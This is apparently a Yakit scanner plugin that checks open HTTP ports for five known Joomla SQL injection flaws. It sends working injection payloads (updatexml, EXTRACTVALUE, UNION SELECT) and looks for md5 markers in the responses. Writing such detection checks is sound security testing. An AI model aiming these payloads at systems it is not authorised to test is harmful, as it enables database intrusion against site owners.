# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 



PacketGET = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`

PacketPOST1 = `POST /index.php?option=com_vreview&task=displayReply HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 192
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}`

PacketPOST2 = `POST /index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails HTTP/1.1
Host: {{params(target)}}
Accept: */*
Accept-Encoding: gzip
Content-Length: 192
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

{{params(payload)}}`

//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}


//填充对应的漏洞检测规则
addRule(PacketPOST1,`profileid=-8511 OR 1 GROUP BY CONCAT(0x7e,md5(8941635),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)#`,func(rsp,header,body){
    if str.MatchAllOfSubString(body, `13cfa92711bac5a975fa0784f852f4`) {
        return true
    }
    return false
},"SQLi","joomla-component-vreview-sql","high","https://www.exploit-db.com/exploits/46227")

addRule(PacketGET,`/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)`,func(rsp,header,body){
    if str.MatchAllOfSubString(body, `cf79ae6addba60ad018347359bd144d2`) {
        return true
    }
    return false
},"SQLi","joomla-cve-2015-7297","high","https://www.exploit-db.com/exploits/38797")

addRule(PacketGET,`/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(8888)),1)`,func(rsp,header,body){
    if str.MatchAllOfSubString(body, `cf79ae6addba60ad018347359bd144d2`) {
        return true
    }
    return false
},"SQLi","joomla-cve-2017-8917","high","https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917")

addRule(PacketGET,`/index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1' AND EXTRACTVALUE(22,CONCAT(0x7e,md5(8941635)))-- X`,func(rsp,header,body){
    if str.MatchAllOfSubString(body, `13cfa92711bac5a975fa0784f852f4`) {
        return true
    }
    return false
},"SQLi","joomla-cve-2018-7314","high","https://www.exploit-db.com/exploits/44160")

addRule(PacketPOST2,`id=-1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,md5(8941635),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+' AND EXTRACTVALUE(22,CONCAT(0x7e,md5(8941635)))-- X`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `13cfa92711bac5a975fa0784f852f464`, `dataexists`) {
        return true
    }
    return false
},"SQLi","joomla-cve-2018-6605","high","https://www.exploit-db.com/exploits/43974")



//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }

        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}



handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }
    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))

    // 漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
